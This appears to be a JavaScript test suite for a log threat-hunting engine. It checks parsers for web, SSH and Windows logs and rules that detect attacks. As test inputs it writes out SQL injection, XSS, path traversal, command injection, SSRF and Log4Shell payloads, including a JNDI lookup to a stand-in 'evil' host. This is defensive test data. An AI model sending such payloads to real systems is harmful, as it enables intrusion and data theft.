// Log Threat Hunter engine tests (public/js/ops/log-hunter-engine.js): format
// parsers (CLF/IIS/JSON, sshd/auth.log/journald, Windows CSV/JSON/XML),
// URL-decoding of encoded probes, CIDR classification, threshold boundaries,
// and positive + negative cases for the detection rules. Pure logic only.

import { test, assert, group } from "../harness.mjs";
import {
  DETECTIONS, DEFAULT_SETTINGS, parseText, analyzeText, urlDecode, isInternalIp, parseCidr, ipToInt,
  parseTs, burstWindow, isOffHours, splitRecords, classifyRequest, winFieldsFromMessage, findingsToCsv, iocText, reportToJson, toSinkFindings,
} from "../../public/js/ops/log-hunter-engine.js";
import { checkSinkFindings } from "./sink-check.mjs";

const has = (r, det) => r.findings.some((f) => f.det === det);
const get = (r, det) => r.findings.find((f) => f.det === det);
const clf = (ip, t, method, path, status, ua) => `${ip} - - [13/Oct/2026:${t} +0000] "${method} ${path} HTTP/1.1" ${status} 512 "-" "${ua || "Mozilla/5.0"}"`;
const pad = (n) => String(n).padStart(2, "0");
const sshFail = (i, ip, user, h = "03", m = 10) => `Oct 13 ${h}:${pad(m + Math.floor(i / 10))}:${pad((i * 7) % 60)} web-01 sshd[${2000 + i}]: Failed password for ${user} from ${ip} port ${40000 + i} ssh2`;
const winJson = (id, t, data, comp = "DC01") => JSON.stringify({ Event: { System: { EventID: id, TimeCreated: { "#attributes": { SystemTime: t } }, Computer: comp }, EventData: data } });

// ---------------------------------------------------------------------------
group("log-hunter: catalogue", () => {
  test("every detection has an ATT&CK technique id, severity, explanation and action", () => {
    for (const [id, d] of Object.entries(DETECTIONS)) {
      assert.ok(/^T\d{4}(\.\d{3})?$/.test(d.technique), id + " technique " + d.technique);
      assert.ok(["critical", "high", "medium", "low"].includes(d.severity), id + " severity");
      assert.ok(d.explain.length > 20 && d.action.length > 20, id + " copy");
    }
    assert.ok(Object.keys(DETECTIONS).length >= 38);
  });
  test("DEFAULT_SETTINGS.assumeYear is a fixed constant, not a module-load wall-clock year (purity)", () => {
    // Was new Date().getUTCFullYear() baked at import time, which both violates the purity rule and
    // freezes the assumed year for the life of the module. 0 means parseTs resolves it lazily at parse time.
    assert.equal(DEFAULT_SETTINGS.assumeYear, 0);
    // An explicit year still flows through to yearless syslog timestamps unchanged.
    const ts = parseTs("Oct 13 10:00:00", 2026);
    assert.equal(new Date(ts).getUTCFullYear(), 2026);
  });
  test("no banned marketing words in rule copy", () => {
    const banned = /seamless|robust|comprehensive|empower|leverage|cutting-edge|unlock|elevate|holistic/i;
    for (const d of Object.values(DETECTIONS)) assert.notOk(banned.test(d.name + d.explain + d.action), d.name);
  });
});

// ---------------------------------------------------------------------------
group("log-hunter: utilities", () => {
  test("urlDecode handles double encoding and plus", () => {
    assert.equal(urlDecode("%2527%20OR%25201%3D1"), "' OR 1=1");
    assert.equal(urlDecode("a+b%20c"), "a b c");
    assert.equal(urlDecode("..%252F..%252Fetc%252Fpasswd"), "../../etc/passwd");
  });
  test("urlDecode survives malformed percent sequences", () => {
    assert.equal(urlDecode("%E0%A4%A-%zz"), "%E0%A4%A-%zz".replace(/%([0-9a-f]{2})/gi, (m, h) => String.fromCharCode(parseInt(h, 16))));
  });
  test("urlDecode collapses inline SQL comments", () => assert.ok(/union\s+select/i.test(urlDecode("UNION/**/SELECT"))));
  test("ipToInt v4 and v6", () => {
    assert.equal(ipToInt("10.0.0.1").n, 167772161n);
    assert.equal(ipToInt("::1").n, 1n);
    assert.equal(ipToInt("::ffff:192.168.1.1").v, 4);
    assert.equal(ipToInt("999.1.1.1"), null);
    assert.equal(ipToInt("not-an-ip"), null);
  });
  test("parseCidr rejects bad prefix", () => { assert.equal(parseCidr("10.0.0.0/40"), null); assert.ok(parseCidr("10.0.0.0/8")); assert.ok(parseCidr("fc00::/7")); });
  test("isInternalIp: RFC1918, loopback, link-local, IPv6 ULA are internal", () => {
    for (const ip of ["10.1.2.3", "172.16.0.1", "172.31.255.255", "192.168.0.9", "127.0.0.1", "169.254.169.254", "::1", "fd12::1", "fe80::1"]) assert.ok(isInternalIp(ip), ip);
  });
  test("isInternalIp: public addresses are external", () => {
    for (const ip of ["8.8.8.8", "172.32.0.1", "172.15.0.1", "203.0.113.5", "2001:db8::1"]) assert.notOk(isInternalIp(ip), ip);
  });
  test("isInternalIp honours custom CIDRs", () => {
    assert.ok(isInternalIp("203.0.113.5", ["203.0.113.0/24"]));
    assert.notOk(isInternalIp("10.0.0.1", ["203.0.113.0/24"]));
  });
  test("parseTs: CLF, syslog, ISO with offsets, IIS, Event Viewer AM/PM, epoch", () => {
    assert.equal(parseTs("13/Oct/2026:09:14:01 +0000"), Date.UTC(2026, 9, 13, 9, 14, 1));
    assert.equal(parseTs("13/Oct/2026:09:14:01 +0200"), Date.UTC(2026, 9, 13, 7, 14, 1));
    assert.equal(parseTs("Oct 13 03:10:00", 2026), Date.UTC(2026, 9, 13, 3, 10, 0));
    assert.equal(parseTs("2026-10-13T03:16:30+0000"), Date.UTC(2026, 9, 13, 3, 16, 30));
    assert.equal(parseTs("2026-10-13T03:16:30.123-05:00"), Date.UTC(2026, 9, 13, 8, 16, 30, 123));
    assert.equal(parseTs("2026-10-13 09:50:00"), Date.UTC(2026, 9, 13, 9, 50, 0));
    assert.equal(parseTs("10/13/2026 1:05:11 PM"), Date.UTC(2026, 9, 13, 13, 5, 11));
    assert.equal(parseTs("10/13/2026 12:05:11 AM"), Date.UTC(2026, 9, 13, 0, 5, 11));
    assert.equal(parseTs(1760000000), 1760000000000);
    assert.equal(parseTs("/Date(1760000000000)/"), 1760000000000);
    assert.equal(parseTs("garbage"), null);
  });
  test("burstWindow: exact threshold boundary", () => {
    const base = Date.UTC(2026, 9, 13);
    const ts = Array.from({ length: 10 }, (_, i) => base + i * 60000); // 10 events in 9 min
    assert.ok(burstWindow(ts, 10, 10 * 60000).hit);
    assert.notOk(burstWindow(ts, 11, 10 * 60000).hit);
    assert.notOk(burstWindow(ts, 10, 8 * 60000).hit, "9 min spread does not fit in 8 min");
    const spread = Array.from({ length: 10 }, (_, i) => base + i * 20 * 60000);
    assert.notOk(burstWindow(spread, 10, 10 * 60000).hit);
    assert.equal(burstWindow(spread, 10, 10 * 60000).best, 1);
  });
  test("burstWindow counts untimed events as in-window", () => {
    assert.ok(burstWindow([null, null, null], 3, 1000).hit);
    assert.notOk(burstWindow([null, null], 3, 1000).hit);
  });
  test("isOffHours uses UTC offset and weekends", () => {
    const s = Object.assign({}, DEFAULT_SETTINGS, { businessStart: 9, businessEnd: 17, utcOffset: 0, weekendOffHours: true });
    assert.notOk(isOffHours(Date.UTC(2026, 9, 13, 10), s)); // Tue 10:00
    assert.ok(isOffHours(Date.UTC(2026, 9, 13, 22), s));
    assert.ok(isOffHours(Date.UTC(2026, 9, 17, 10), s)); // Saturday
    assert.ok(isOffHours(Date.UTC(2026, 9, 13, 10), Object.assign({}, s, { utcOffset: 10 }))); // 20:00 local
    assert.notOk(isOffHours(Date.UTC(2026, 9, 17, 10), Object.assign({}, s, { weekendOffHours: false })));
  });
});

// ---------------------------------------------------------------------------
group("log-hunter: web parsers", () => {
  test("nginx/Apache combined log", () => {
    const { events } = parseText(clf("203.0.113.5", "09:10:00", "GET", "/products?id=1", 200, "UA/1"));
    assert.equal(events.length, 1);
    const e = events[0];
    assert.equal(e.source, "web"); assert.equal(e.format, "clf"); assert.equal(e.ip, "203.0.113.5");
    assert.equal(e.method, "GET"); assert.equal(e.path, "/products?id=1"); assert.equal(e.status, 200); assert.equal(e.ua, "UA/1");
    assert.equal(e.ts, Date.UTC(2026, 9, 13, 9, 10, 0));
  });
  test("common log format without referer/UA and with authenticated user", () => {
    const { events } = parseText('203.0.113.5 - alice [13/Oct/2026:09:10:00 +0000] "GET /x HTTP/1.0" 404 -');
    assert.equal(events.length, 1); assert.equal(events[0].user, "alice"); assert.equal(events[0].status, 404); assert.equal(events[0].ua, null);
  });
  test("X-Forwarded-For variants: leading list and trailing quoted field", () => {
    const a = parseText('10.0.0.1, 198.51.100.7 - - [13/Oct/2026:09:10:00 +0000] "GET / HTTP/1.1" 200 1 "-" "UA"').events[0];
    assert.equal(a.ip, "10.0.0.1");
    const b = parseText('10.0.0.1 - - [13/Oct/2026:09:10:00 +0000] "GET / HTTP/1.1" 200 1 "-" "UA" "198.51.100.7"').events[0];
    assert.equal(b.ip, "198.51.100.7"); assert.equal(b.extra.proxyIp, "10.0.0.1");
  });
  test("vhost-prefixed combined log keeps host", () => {
    const e = parseText('shop.example 203.0.113.5 - - [13/Oct/2026:09:10:00 +0000] "GET / HTTP/1.1" 200 1 "-" "UA"').events[0];
    assert.equal(e.host, "shop.example"); assert.equal(e.ip, "203.0.113.5");
  });
  test("IIS W3C with #Fields header", () => {
    const txt = "#Software: Microsoft Internet Information Services 10.0\n#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken\n2026-10-13 09:50:00 10.0.0.2 GET /default.aspx a=1 443 - 203.0.113.6 Mozilla/5.0+(Windows) - 200 0 0 15\n";
    const { events, stats } = parseText(txt);
    assert.equal(events.length, 1); assert.equal(stats.unknown, 0);
    const e = events[0];
    assert.equal(e.format, "iis"); assert.equal(e.ip, "203.0.113.6"); assert.equal(e.path, "/default.aspx?a=1"); assert.equal(e.ua, "Mozilla/5.0 (Windows)"); assert.equal(e.status, 200);
    assert.equal(e.ts, Date.UTC(2026, 9, 13, 9, 50, 0));
  });
  test("IIS custom field order with X-Forwarded-For", () => {
    const txt = "#Fields: date time c-ip cs-method cs-uri-stem sc-status cs(X-Forwarded-For)\n2026-10-13 09:50:00 10.0.0.2 POST /login 401 198.51.100.9\n";
    const e = parseText(txt).events[0];
    assert.equal(e.ip, "198.51.100.9"); assert.equal(e.method, "POST"); assert.equal(e.status, 401);
  });
  test("Cloudflare JSON line", () => {
    const e = parseText(JSON.stringify({ ClientIP: "203.0.113.7", ClientRequestMethod: "GET", ClientRequestURI: "/pricing?x=1", ClientRequestHost: "shop.example", EdgeResponseStatus: 503, ClientRequestUserAgent: "UA", EdgeStartTimestamp: 1760346900000000000 })).events[0];
    assert.equal(e.format, "json"); assert.equal(e.ip, "203.0.113.7"); assert.equal(e.path, "/pricing?x=1"); assert.equal(e.status, 503); assert.equal(e.host, "shop.example");
    assert.equal(e.ts, 1760346900000);
  });
  test("ALB-style JSON with request string and client:port", () => {
    const e = parseText(JSON.stringify({ time: "2026-10-13T09:00:00Z", client: "203.0.113.8:5533", request: "GET https://shop.example:443/cart?x=1 HTTP/1.1", elb_status_code: "200", user_agent: "UA" })).events[0];
    assert.equal(e.ip, "203.0.113.8"); assert.equal(e.method, "GET"); assert.equal(e.path, "/cart?x=1"); assert.equal(e.status, 200);
  });
});

// ---------------------------------------------------------------------------
group("log-hunter: linux parsers", () => {
  test("sshd failed/accepted/invalid/closed/sudo/pam/useradd/usermod/breakin", () => {
    const txt = [
      "Oct 13 03:10:00 web-01 sshd[1]: Failed password for invalid user admin from 198.51.100.44 port 4000 ssh2",
      "Oct 13 03:10:01 web-01 sshd[2]: Accepted publickey for deploy from 10.0.0.15 port 52000 ssh2: ED25519 SHA256:abc",
      "Oct 13 03:10:02 web-01 sshd[3]: Invalid user oracle from 198.51.100.44 port 4001",
      "Oct 13 03:10:03 web-01 sshd[4]: Connection closed by authenticating user root 198.51.100.44 port 4002 [preauth]",
      "Oct 13 03:10:04 web-01 sudo:   deploy : TTY=pts/1 ; PWD=/srv ; USER=root ; COMMAND=/usr/bin/systemctl restart app",
      "Oct 13 03:10:05 web-01 sshd[5]: pam_unix(sshd:session): session opened for user deploy by (uid=0)",
      "Oct 13 03:10:06 web-01 useradd[6]: new user: name=backup2, UID=1005, GID=1005, home=/home/backup2, shell=/bin/bash",
      "Oct 13 03:10:07 web-01 usermod[7]: add 'backup2' to group 'sudo'",
      "Oct 13 03:10:08 web-01 sshd[8]: reverse mapping checking getaddrinfo for h [198.51.100.45] failed - POSSIBLE BREAK-IN ATTEMPT!",
      "Oct 13 03:10:09 web-01 groupadd[9]: new group: name=ops, GID=1010",
    ].join("\n");
    const { events, stats } = parseText(txt, "", { assumeYear: 2026 });
    assert.equal(stats.unknown, 0); assert.equal(events.length, 10);
    const acts = events.map((e) => e.action);
    assert.deepEqual(acts, ["auth_fail", "auth_ok", "invalid_user", "auth_fail", "sudo", "session_open", "user_add", "group_add", "breakin", "group_add"].map((a, i) => i === 7 ? "group_member_add" : a));
    assert.equal(events[0].user, "admin"); assert.equal(events[0].ip, "198.51.100.44"); assert.ok(events[0].extra.invalid);
    assert.equal(events[1].extra.method, "publickey"); assert.equal(events[1].ip, "10.0.0.15");
    assert.equal(events[4].extra.command, "/usr/bin/systemctl restart app"); assert.equal(events[4].user, "deploy");
    assert.equal(events[6].user, "backup2"); assert.equal(events[7].extra.group, "sudo"); assert.equal(events[8].ip, "198.51.100.45");
    assert.equal(events[0].ts, Date.UTC(2026, 9, 13, 3, 10, 0)); assert.equal(events[0].host, "web-01");
  });
  test("journald short-iso prefix and ISO with microseconds", () => {
    const a = parseText("2026-10-13T03:16:30+0000 web-01 crontab[2300]: (root) REPLACE (root)").events[0];
    assert.equal(a.action, "cron_write"); assert.equal(a.ts, Date.UTC(2026, 9, 13, 3, 16, 30));
    const b = parseText("2026-10-13T03:16:31.123456+00:00 web-01 sshd[9]: Accepted password for root from 203.0.113.1 port 1 ssh2").events[0];
    assert.equal(b.action, "auth_ok"); assert.equal(b.user, "root");
  });
  test("fragment without syslog prefix still parses", () => {
    const e = parseText("sshd[123]: Failed password for root from 203.0.113.2 port 1 ssh2").events[0];
    assert.ok(e); assert.equal(e.action, "auth_fail"); assert.equal(e.ts, null);
  });
  test("unrelated text is counted as unknown, not misparsed", () => {
    const { events, stats } = parseText("hello world\nthis is not a log\n");
    assert.equal(events.length, 0); assert.equal(stats.unknown, 2);
  });
});

// ---------------------------------------------------------------------------
group("log-hunter: windows parsers", () => {
  const csvHead = "Level,Date and Time,Source,Event ID,Task Category\n";
  const msg4625 = 'An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nLogon Type:\t\t\t3\n\nNetwork Information:\n\tWorkstation Name:\tWS-UNKNOWN\n\tSource Network Address:\t203.0.113.9\n\tSource Port:\t\t5100';
  test("Event Viewer CSV with quoted multi-line message (4625)", () => {
    const txt = csvHead + `Information,10/13/2026 1:05:11 PM,Microsoft-Windows-Security-Auditing,4625,Logon,"${msg4625.replace(/"/g, '""')}"\n`;
    const { records, mode } = splitRecords(txt, "sec.csv");
    assert.equal(mode, "csv"); assert.equal(records.length, 2);
    const { events, stats } = parseText(txt, "sec.csv");
    assert.equal(stats.unknown, 0); assert.equal(events.length, 1);
    const e = events[0];
    assert.equal(e.eventId, 4625); assert.equal(e.user, "jsmith"); assert.equal(e.ip, "203.0.113.9"); assert.equal(e.extra.logonType, 3);
    assert.equal(e.extra.status, "0xC000006D"); assert.equal(e.extra.subStatus, "0xC000006A"); assert.equal(e.extra.workstation, "WS-UNKNOWN");
    assert.equal(e.ts, Date.UTC(2026, 9, 13, 13, 5, 11)); assert.equal(e.format, "wincsv");
  });
  test("winFieldsFromMessage is section-aware (Subject vs New Logon, Member vs Group)", () => {
    const f = winFieldsFromMessage("Subject:\n\tAccount Name:\t\tjdoe\n\nNew Logon:\n\tAccount Name:\t\tadministrator\n\tLogon Type:\t\t10");
    assert.equal(f.subjectUser, "jdoe"); assert.equal(f.targetUser, "administrator");
    const g = winFieldsFromMessage("Subject:\n\tAccount Name:\tjdoe\n\nMember:\n\tSecurity ID:\tS-1-5-21-1\n\tAccount Name:\tCORP\\bob\n\nGroup:\n\tSecurity ID:\tS-1-5-32-544\n\tGroup Name:\tAdministrators");
    assert.equal(g.member, "CORP\\bob"); assert.equal(g.group, "Administrators"); assert.equal(g.subjectUser, "jdoe");
  });
  test("EVTX JSON (evtx_dump shape) 4624 with LogonType and IpAddress", () => {
    const e = parseText(winJson(4624, "2026-10-13T14:10:00Z", { TargetUserName: "mlee", SubjectUserName: "-", LogonType: "10", IpAddress: "::ffff:203.0.113.9", WorkstationName: "WS1" })).events[0];
    assert.equal(e.source, "windows"); assert.equal(e.format, "winjson"); assert.equal(e.eventId, 4624);
    assert.equal(e.user, "mlee"); assert.equal(e.ip, "203.0.113.9"); assert.equal(e.extra.logonType, 10); assert.equal(e.host, "DC01");
    assert.equal(e.ts, Date.UTC(2026, 9, 13, 14, 10, 0));
  });
  test("EVTX JSON flat and winlogbeat shapes; XML Data arrays", () => {
    const flat = parseText(JSON.stringify({ EventID: 4720, TimeCreated: "2026-10-13T14:00:00Z", Computer: "DC01", EventData: { TargetUserName: "newguy", SubjectUserName: "jdoe" } })).events[0];
    assert.equal(flat.eventId, 4720); assert.equal(flat.user, "newguy"); assert.equal(flat.extra.subjectUser, "jdoe");
    const beat = parseText(JSON.stringify({ "@timestamp": "2026-10-13T14:00:00Z", winlog: { event_id: "4769", computer_name: "DC01", event_data: { TargetUserName: "bob@CORP", ServiceName: "svc_sql", TicketEncryptionType: "0x17", Status: "0x0" } } })).events[0];
    assert.equal(beat.eventId, 4769); assert.equal(beat.extra.encType, "0x17"); assert.equal(beat.extra.service, "svc_sql");
    const arr = parseText(JSON.stringify({ Event: { System: { EventID: { "#text": 4732 } }, EventData: { Data: [{ "@Name": "MemberName", "#text": "CN=bob,CN=Users,DC=corp" }, { "@Name": "TargetUserName", "#text": "Administrators" }, { "@Name": "SubjectUserName", "#text": "jdoe" }] } } })).events[0];
    assert.equal(arr.eventId, 4732); assert.equal(arr.extra.group, "Administrators"); assert.equal(arr.extra.member, "bob"); assert.equal(arr.user, "bob");
  });
  test("EVTX XML records split on </Event> with line numbers", () => {
    const xml = '<Event xmlns="x"><System><EventID>7045</EventID><TimeCreated SystemTime="2026-10-13T10:00:00Z"/><Computer>WS1</Computer></System>\n<EventData><Data Name="ServiceName">upd</Data><Data Name="ImagePath">C:\\Users\\Public\\x.exe</Data></EventData></Event>\n<Event><System><EventID>1102</EventID><Computer>WS1</Computer></System><UserData><LogFileCleared><SubjectUserName>jdoe</SubjectUserName></LogFileCleared></UserData></Event>';
    const { records, mode } = splitRecords(xml, "x.xml");
    assert.equal(mode, "xml"); assert.equal(records.length, 2); assert.equal(records[1].lineNo, 3);
    const { events } = parseText(xml, "x.xml");
    assert.equal(events[0].eventId, 7045); assert.equal(events[0].extra.service, "upd"); assert.equal(events[0].extra.imagePath, "C:\\Users\\Public\\x.exe"); assert.equal(events[0].host, "WS1");
    assert.equal(events[1].eventId, 1102);
  });
  test("PowerShell Get-WinEvent JSON (Id + Message) parses via message fields", () => {
    const e = parseText(JSON.stringify({ Id: 4740, TimeCreated: "/Date(1760346900000)/", MachineName: "DC01", ProviderName: "Microsoft-Windows-Security-Auditing", Message: "A user account was locked out.\n\nSubject:\n\tAccount Name:\t\tDC01$\n\nAccount That Was Locked Out:\n\tAccount Name:\t\tjsmith\n\nAdditional Information:\n\tCaller Computer Name:\tWS-044" })).events[0];
    assert.equal(e.eventId, 4740); assert.equal(e.user, "jsmith"); assert.equal(e.extra.workstation, "WS-044"); assert.equal(e.ts, 1760346900000);
  });
});

// ---------------------------------------------------------------------------
group("log-hunter: web detections", () => {
  const ev = (path, o) => Object.assign({ path, method: "GET", status: 200, ua: "Mozilla/5.0", extra: {} }, o);
  test("SQLi: plain, URL-encoded, double-encoded, comment-obfuscated", () => {
    for (const p of ["/p?id=1 UNION SELECT 1,2", "/p?id=1%20UNION%20SELECT%201", "/p?id=1%2527%20OR%201%3D1", "/p?id=1'/**/OR/**/1=1", "/p?id=1 AND SLEEP(5)", "/p?id=1;WAITFOR DELAY '0:0:5'", "/p?q=information_schema.tables"])
      assert.ok(classifyRequest(ev(p)).includes("web.sqli"), p);
  });
  test("SQLi negatives: normal queries with words like select or union", () => {
    for (const p of ["/products?category=union-jack-flags", "/search?q=select+a+plan", "/api/orders?status=pending&page=2", "/blog/how-to-sleep-better"])
      assert.notOk(classifyRequest(ev(p)).includes("web.sqli"), p);
  });
  test("XSS, traversal, command injection, Log4Shell, SSRF positives", () => {
    assert.ok(classifyRequest(ev("/s?q=%3Cscript%3Ealert(1)%3C/script%3E")).includes("web.xss"));
    assert.ok(classifyRequest(ev("/s?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E")).includes("web.xss"));
    assert.ok(classifyRequest(ev("/d?f=..%2F..%2Fetc%2Fpasswd")).includes("web.traversal"));
    assert.ok(classifyRequest(ev("/d?f=..%252f..%252fwindows%252fwin.ini")).includes("web.traversal"));
    assert.ok(classifyRequest(ev("/ping?h=1;cat%20/etc/passwd")).includes("web.cmdi"));
    assert.ok(classifyRequest(ev("/ping?h=%24(whoami)")).includes("web.cmdi"));
    assert.ok(classifyRequest(ev("/?x=%24%7Bjndi%3Aldap%3A//evil/a%7D")).includes("web.log4shell"));
    assert.ok(classifyRequest(ev("/", { ua: "${${lower:j}ndi:ldap://x/a}" })).includes("web.log4shell"));
    assert.ok(classifyRequest(ev("/fetch?url=http://169.254.169.254/latest/meta-data/")).includes("web.ssrf"));
    assert.ok(classifyRequest(ev("/fetch?url=file:///etc/passwd")).includes("web.ssrf"));
  });
  test("XSS/traversal/SSRF negatives", () => {
    assert.notOk(classifyRequest(ev("/docs/javascript-guide")).includes("web.xss"));
    assert.notOk(classifyRequest(ev("/files/report..pdf")).includes("web.traversal"));
    assert.notOk(classifyRequest(ev("/fetch?url=https://example.com/feed.xml")).includes("web.ssrf"));
    assert.notOk(classifyRequest(ev("/?x=${price}")).includes("web.log4shell"));
  });
  test("web shell: known names, cmd params on scripts, POST to script in uploads; not a normal PHP page", () => {
    assert.ok(classifyRequest(ev("/images/c99.php")).includes("web.webshell"));
    assert.ok(classifyRequest(ev("/x/page.php?cmd=id")).includes("web.webshell"));
    assert.ok(classifyRequest(ev("/wp-content/uploads/2026/a.php", { method: "POST" })).includes("web.webshell"));
    assert.notOk(classifyRequest(ev("/index.php?page=about")).includes("web.webshell"));
    assert.notOk(classifyRequest(ev("/wp-content/uploads/2026/a.php")).includes("web.webshell"), "GET to uploads script alone is not flagged");
  });
  test("sensitive paths split by status; scanner user-agents", () => {
    assert.ok(classifyRequest(ev("/.env", { status: 404 })).includes("web.sensitive"));
    assert.ok(classifyRequest(ev("/.git/config", { status: 200 })).includes("web.sensitive.served"));
    assert.ok(classifyRequest(ev("/", { ua: "Mozilla/5.0 (compatible; Nikto/2.5.0)" })).includes("web.scanner"));
    assert.ok(classifyRequest(ev("/", { ua: "sqlmap/1.8" })).includes("web.scanner"));
    assert.notOk(classifyRequest(ev("/environment", { status: 200 })).includes("web.sensitive"));
    assert.notOk(classifyRequest(ev("/", { ua: "Mozilla/5.0 Chrome/130" })).includes("web.scanner"));
  });
  test("404 burst fires at threshold and not below", () => {
    const lines = (n) => Array.from({ length: n }, (_, i) => clf("192.0.2.77", `09:2${Math.floor(i / 10)}:${pad(i % 60)}`, "GET", "/p" + i, 404)).join("\n");
    assert.ok(has(analyzeText(lines(30), { notFoundBurstN: 30, notFoundWindowMin: 10 }), "web.404burst"));
    assert.notOk(has(analyzeText(lines(29), { notFoundBurstN: 30, notFoundWindowMin: 10 }), "web.404burst"));
    assert.notOk(has(analyzeText(lines(30), { notFoundBurstN: 30, notFoundWindowMin: 1 }), "web.404burst"), "spread over 3 min does not fit a 1 min window");
  });
  test("credential stuffing and success-after-failures on a login path; custom login paths", () => {
    const L = []; for (let i = 0; i < 20; i++) L.push(clf("192.0.2.88", `09:30:${pad(i)}`, "POST", "/login", 401, "python-requests/2.32"));
    L.push(clf("192.0.2.88", "09:30:25", "POST", "/login", 200, "python-requests/2.32"));
    const r = analyzeText(L.join("\n"), { loginAttemptsN: 20, loginWindowMin: 30 });
    assert.ok(has(r, "web.credstuff")); assert.ok(has(r, "web.credstuff.success"));
    assert.equal(get(r, "web.credstuff").severity, "high");
    assert.equal(get(r, "web.credstuff").evidence[0].lineNo, 1);
    const r2 = analyzeText(L.join("\n"), { loginAttemptsN: 20, loginPaths: ["/api/session"] });
    assert.notOk(has(r2, "web.credstuff"), "other login paths configured");
    const okOnly = Array.from({ length: 25 }, (_, i) => clf("192.0.2.88", `09:30:${pad(i)}`, "POST", "/login", 200)).join("\n");
    assert.notOk(has(analyzeText(okOnly, { loginAttemptsN: 30 }), "web.credstuff"), "below threshold");
    assert.notOk(has(analyzeText(okOnly, { loginAttemptsN: 20 }), "web.credstuff.success"), "no failures before the 200s");
  });
  test("scripted-client burst threshold", () => {
    const L = Array.from({ length: 50 }, (_, i) => clf("192.0.2.5", `09:30:${pad(i % 60)}`, "GET", "/api/items", 200, "python-requests/2.32"));
    assert.ok(has(analyzeText(L.join("\n"), { uaBurstN: 50 }), "web.toolburst"));
    assert.notOk(has(analyzeText(L.slice(0, 49).join("\n"), { uaBurstN: 50 }), "web.toolburst"));
  });
  test("SQLi probe returning 500 keeps high severity; all-4xx probes drop to medium", () => {
    const r = analyzeText(clf("198.51.100.23", "09:14:01", "GET", "/p?id=1%20UNION%20SELECT%201", 500));
    assert.equal(get(r, "web.sqli").severity, "high");
    const r2 = analyzeText(clf("198.51.100.23", "09:14:01", "GET", "/p?id=1%20UNION%20SELECT%201", 403));
    assert.equal(get(r2, "web.sqli").severity, "medium");
  });
  test("findings carry evidence with file tag and line number, ATT&CK id, action", () => {
    const r = analyzeText(clf("198.51.100.23", "09:14:01", "GET", "/p?id=1%20UNION%20SELECT%201", 200), {}, "access.log");
    const f = get(r, "web.sqli");
    assert.equal(f.technique, "T1190"); assert.equal(f.ip, "198.51.100.23"); assert.equal(f.evidence[0].file, "access.log"); assert.equal(f.evidence[0].lineNo, 1);
    assert.ok(f.action.length > 20); assert.ok(f.id.startsWith("F-"));
  });
});

// ---------------------------------------------------------------------------
group("log-hunter: linux detections", () => {
  test("SSH brute force at threshold (10 in 10 min) and not at 9", () => {
    const ten = Array.from({ length: 10 }, (_, i) => sshFail(i, "198.51.100.44", "root")).join("\n");
    const r = analyzeText(ten, { bruteN: 10, bruteWindowMin: 10, assumeYear: 2026 });
    assert.ok(has(r, "linux.brute")); assert.equal(get(r, "linux.brute").ip, "198.51.100.44"); assert.equal(get(r, "linux.brute").severity, "high");
    assert.notOk(has(analyzeText(Array.from({ length: 9 }, (_, i) => sshFail(i, "198.51.100.44", "root")).join("\n"), { bruteN: 10, assumeYear: 2026 }), "linux.brute"));
  });
  test("brute force from an internal IP is medium", () => {
    const r = analyzeText(Array.from({ length: 10 }, (_, i) => sshFail(i, "10.0.0.9", "root")).join("\n"), { assumeYear: 2026 });
    assert.equal(get(r, "linux.brute").severity, "medium");
  });
  test("brute force spread over hours does not fit the window", () => {
    const L = Array.from({ length: 10 }, (_, i) => `Oct 13 ${pad(i)}:00:00 web-01 sshd[${i}]: Failed password for root from 198.51.100.44 port 1 ssh2`);
    assert.notOk(has(analyzeText(L.join("\n"), { bruteN: 10, bruteWindowMin: 10, assumeYear: 2026 }), "linux.brute"));
  });
  test("distributed brute force on one account (distinct IPs threshold)", () => {
    const L = Array.from({ length: 5 }, (_, i) => sshFail(i, "203.0.113." + (10 + i), "deploy"));
    assert.ok(has(analyzeText(L.join("\n"), { distIpsN: 5, assumeYear: 2026 }), "linux.spray"));
    assert.notOk(has(analyzeText(L.slice(0, 4).join("\n"), { distIpsN: 5, assumeYear: 2026 }), "linux.spray"));
  });
  test("success after failures (same IP) is high; critical for root; absent without prior failures", () => {
    const L = Array.from({ length: 3 }, (_, i) => sshFail(i, "198.51.100.44", "deploy"));
    L.push("Oct 13 03:12:00 web-01 sshd[9]: Accepted password for deploy from 198.51.100.44 port 1 ssh2");
    const r = analyzeText(L.join("\n"), { successAfterFailN: 3, assumeYear: 2026 });
    assert.ok(has(r, "linux.success_after_fail")); assert.equal(get(r, "linux.success_after_fail").severity, "high"); assert.equal(get(r, "linux.success_after_fail").user, "deploy");
    const Lr = L.slice(0, 3); Lr.push("Oct 13 03:12:00 web-01 sshd[9]: Accepted password for root from 198.51.100.44 port 1 ssh2");
    assert.equal(get(analyzeText(Lr.join("\n"), { assumeYear: 2026 }), "linux.success_after_fail").severity, "critical");
    assert.notOk(has(analyzeText("Oct 13 03:12:00 web-01 sshd[9]: Accepted publickey for deploy from 10.0.0.15 port 1 ssh2", { assumeYear: 2026 }), "linux.success_after_fail"));
    assert.notOk(has(analyzeText(L.slice(0, 2).concat(L[3]).join("\n"), { successAfterFailN: 3, assumeYear: 2026 }), "linux.success_after_fail"), "2 failures is below threshold");
  });
  test("invalid-user enumeration needs distinct names", () => {
    const names = ["admin", "oracle", "test", "ubuntu", "git"];
    const L = names.map((u, i) => sshFail(i, "198.51.100.44", "invalid user " + u));
    assert.ok(has(analyzeText(L.join("\n"), { invalidUserN: 5, bruteN: 99, assumeYear: 2026 }), "linux.invalid_user"));
    const same = Array.from({ length: 5 }, (_, i) => sshFail(i, "198.51.100.44", "invalid user admin"));
    assert.notOk(has(analyzeText(same.join("\n"), { invalidUserN: 5, bruteN: 99, assumeYear: 2026 }), "linux.invalid_user"));
  });
  test("root login: external high, internal medium; new user; privileged group; sudoers", () => {
    const r = analyzeText("Oct 13 10:00:00 h sshd[1]: Accepted password for root from 203.0.113.1 port 1 ssh2", { assumeYear: 2026 });
    assert.equal(get(r, "linux.root_login").severity, "high"); assert.equal(get(r, "linux.root_login").technique, "T1078.003");
